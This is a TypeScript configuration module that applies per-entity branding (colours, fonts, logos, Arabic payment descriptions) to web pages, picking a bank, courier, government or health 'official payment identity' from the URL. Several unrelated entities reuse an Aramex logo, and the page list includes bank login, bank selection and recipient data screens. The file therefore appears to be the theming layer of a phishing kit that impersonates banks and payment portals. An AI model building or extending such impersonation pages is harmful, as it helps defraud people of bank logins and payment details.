import { serviceLogos } from './serviceLogos';
import { bankBranding } from './brandingSystem';

export interface DynamicIdentityEntity {
  logo: string;
  animated_header_images: string[];
  header_position: 'below_top_bar' | 'top' | 'center';
  payment_share_image: string;
  payment_share_description: string;
  colors: {
    primary: string;
    secondary: string;
    background: string;
  };
  fonts: string[];
  buttons: {
    style: 'rounded' | 'flat' | 'sharp';
    hover: 'darken' | 'highlight' | 'scale';
  };
  background_images: string[];
  auto_apply: boolean;
  dynamic_behavior?: {
    on_bank_selection?: {
      apply_identity: boolean;
    };
  };
}

export interface DynamicIdentityConfig {
  entities: Record<string, DynamicIdentityEntity>;
  pages: string[];
  dynamic_application: boolean;
  enforce_official_assets_only: boolean;
  auto_run_on_load: boolean;
}

const generateEntitiesFromServices = (): Record<string, DynamicIdentityEntity> => {
  const entities: Record<string, DynamicIdentityEntity> = {};
  
  Object.entries(serviceLogos).forEach(([key, service]) => {
    entities[key] = {
      logo: service.logo,
      animated_header_images: [service.heroImage || service.ogImage || ''],
      header_position: 'below_top_bar',
      payment_share_image: service.ogImage || '',
      payment_share_description: service.description || `خدمات ${key}`,
      colors: {
        primary: service.colors.primary,
        secondary: service.colors.secondary,
        background: '#ffffff',
      },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: {
        style: 'rounded',
        hover: 'darken',
      },
      background_images: [service.heroImage || service.ogImage || ''],
      auto_apply: true,
    };
  });
  
  return entities;
};

const generateEntitiesFromBanks = (): Record<string, DynamicIdentityEntity> => {
  const entities: Record<string, DynamicIdentityEntity> = {};
  
  Object.entries(bankBranding).forEach(([key, bank]) => {
    entities[`bank_${key}`] = {
      logo: '',
      animated_header_images: [],
      header_position: 'below_top_bar',
      payment_share_image: '',
      payment_share_description: `الخدمات المصرفية الإلكترونية - ${bank.nameAr}`,
      colors: {
        primary: bank.colors.primary,
        secondary: bank.colors.secondary || bank.colors.primary,
        background: bank.colors.background,
      },
      fonts: [bank.fonts.arabic, bank.fonts.primary],
      buttons: {
        style: 'rounded',
        hover: 'darken',
      },
      background_images: [],
      auto_apply: true,
      dynamic_behavior: {
        on_bank_selection: {
          apply_identity: true,
        },
      },
    };
  });
  
  return entities;
};

export const dynamicIdentityConfig: DynamicIdentityConfig = {
  entities: {
    ...generateEntitiesFromServices(),
    ...generateEntitiesFromBanks(),
    chalets: {
      logo: '/og-aramex.jpg',
      animated_header_images: ['/hero-bg.jpg'],
      header_position: 'below_top_bar',
      payment_share_image: '/og-aramex.jpg',
      payment_share_description: 'احجز شاليه أحلامك بسهولة وأمان مع هوية الدفع الرسمية.',
      colors: { primary: '#FF6F00', secondary: '#FFA000', background: '#FFF3E0' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'rounded', hover: 'darken' },
      background_images: ['/hero-bg.jpg'],
      auto_apply: true,
    },
    government_payment: {
      logo: '/og-aramex.jpg',
      animated_header_images: ['/hero-bg.jpg'],
      header_position: 'below_top_bar',
      payment_share_image: '/og-aramex.jpg',
      payment_share_description: 'سداد حكومي سريع وآمن مع هوية الدفع الرسمية للجهة.',
      colors: { primary: '#004080', secondary: '#0073E6', background: '#E6F0FF' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'flat', hover: 'highlight' },
      background_images: ['/hero-bg.jpg'],
      auto_apply: true,
    },
    local_payment: {
      logo: '/og-aramex.jpg',
      animated_header_images: ['/hero-bg.jpg'],
      header_position: 'below_top_bar',
      payment_share_image: '/og-aramex.jpg',
      payment_share_description: 'سداد محلي سريع وآمن مع هوية الدفع الرسمية للبوابة.',
      colors: { primary: '#008000', secondary: '#00C000', background: '#E6FFE6' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'rounded', hover: 'darken' },
      background_images: ['/hero-bg.jpg'],
      auto_apply: true,
    },
    invoices: {
      logo: '/og-aramex.jpg',
      animated_header_images: ['/hero-bg.jpg'],
      header_position: 'below_top_bar',
      payment_share_image: '/og-aramex.jpg',
      payment_share_description: 'عرض الفواتير الرسمي بدقة مع هوية الدفع للجهة.',
      colors: { primary: '#800000', secondary: '#B22222', background: '#FFE6E6' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'flat', hover: 'highlight' },
      background_images: ['/hero-bg.jpg'],
      auto_apply: true,
    },
    contracts: {
      logo: '/og-aramex.jpg',
      animated_header_images: ['/hero-bg.jpg'],
      header_position: 'below_top_bar',
      payment_share_image: '/og-aramex.jpg',
      payment_share_description: 'العقود الرسمية مع هوية الدفع المعتمدة للجهة.',
      colors: { primary: '#000080', secondary: '#0000CD', background: '#E6E6FF' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'rounded', hover: 'darken' },
      background_images: ['/hero-bg.jpg'],
      auto_apply: true,
    },
    health_links: {
      logo: '/og-aramex.jpg',
      animated_header_images: ['/hero-bg.jpg'],
      header_position: 'below_top_bar',
      payment_share_image: '/og-aramex.jpg',
      payment_share_description: 'الخدمات الصحية الرسمية مع هوية الدفع الخاصة بالجهة.',
      colors: { primary: '#008080', secondary: '#20B2AA', background: '#E0FFFF' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'flat', hover: 'highlight' },
      background_images: ['/hero-bg.jpg'],
      auto_apply: true,
    },
    bank_pages: {
      logo: '/og-aramex.jpg',
      animated_header_images: ['/hero-bg.jpg'],
      header_position: 'below_top_bar',
      payment_share_image: '/og-aramex.jpg',
      payment_share_description: 'الوصول إلى الدفع البنكي الرسمي مع الهوية البصرية لكل صفحة.',
      colors: { primary: '#0000FF', secondary: '#1E90FF', background: '#E6F0FF' },
      fonts: ['Cairo', 'Tajawal', 'Arial'],
      buttons: { style: 'rounded', hover: 'darken' },
      background_images: ['/hero-bg.jpg'],
      dynamic_behavior: { on_bank_selection: { apply_identity: true } },
      auto_apply: true,
    },
  },
  pages: [
    'payment_main',
    'payment_details',
    'confirmation',
    'history',
    'subpages',
    'recipient_data',
    'bank_login',
    'bank_selection',
  ],
  dynamic_application: true,
  enforce_official_assets_only: true,
  auto_run_on_load: true,
};

export const getEntityIdentity = (entityKey: string): DynamicIdentityEntity | null => {
  return dynamicIdentityConfig.entities[entityKey] || null;
};

export const applyDynamicIdentity = (entityKey: string) => {
  const identity = getEntityIdentity(entityKey);
  if (!identity || !identity.auto_apply) return;

  const root = document.documentElement;

  root.style.setProperty('--dynamic-primary', identity.colors.primary);
  root.style.setProperty('--dynamic-secondary', identity.colors.secondary);
  root.style.setProperty('--dynamic-background', identity.colors.background);

  root.style.setProperty('--dynamic-font-primary', identity.fonts[0]);
  root.style.setProperty('--dynamic-font-secondary', identity.fonts[1] || identity.fonts[0]);

  const buttonRadius = identity.buttons.style === 'rounded' ? '12px' : identity.buttons.style === 'flat' ? '4px' : '0px';
  root.style.setProperty('--dynamic-button-radius', buttonRadius);

  root.setAttribute('data-entity', entityKey);
  root.setAttribute('data-button-hover', identity.buttons.hover);
};

export const removeDynamicIdentity = () => {
  const root = document.documentElement;
  root.style.removeProperty('--dynamic-primary');
  root.style.removeProperty('--dynamic-secondary');
  root.style.removeProperty('--dynamic-background');
  root.style.removeProperty('--dynamic-font-primary');
  root.style.removeProperty('--dynamic-font-secondary');
  root.style.removeProperty('--dynamic-button-radius');
  root.removeAttribute('data-entity');
  root.removeAttribute('data-button-hover');
};

export const getEntityLogo = (entityKey: string): string | null => {
  const identity = getEntityIdentity(entityKey);
  return identity?.logo || null;
};

export const getEntityHeaderImages = (entityKey: string): string[] => {
  const identity = getEntityIdentity(entityKey);
  return identity?.animated_header_images || [];
};

export const getEntityBackgroundImages = (entityKey: string): string[] => {
  const identity = getEntityIdentity(entityKey);
  return identity?.background_images || [];
};

export const getEntityPaymentShareImage = (entityKey: string): string | null => {
  const identity = getEntityIdentity(entityKey);
  return identity?.payment_share_image || null;
};

export const shouldAutoApply = (entityKey: string): boolean => {
  const identity = getEntityIdentity(entityKey);
  return identity?.auto_apply || false;
};

export const detectEntityFromURL = (): string | null => {
  const params = new URLSearchParams(window.location.search);
  const entity = params.get('entity') || params.get('type');
  
  const path = window.location.pathname.toLowerCase();
  if (path.includes('chalet')) return 'chalets';
  if (path.includes('government') || path.includes('gov')) return 'government_payment';
  if (path.includes('local')) return 'local_payment';
  if (path.includes('invoice')) return 'invoices';
  if (path.includes('contract')) return 'contracts';
  if (path.includes('health')) return 'health_links';
  if (path.includes('bank')) return 'bank_pages';
  
  return entity;
};

export default dynamicIdentityConfig;
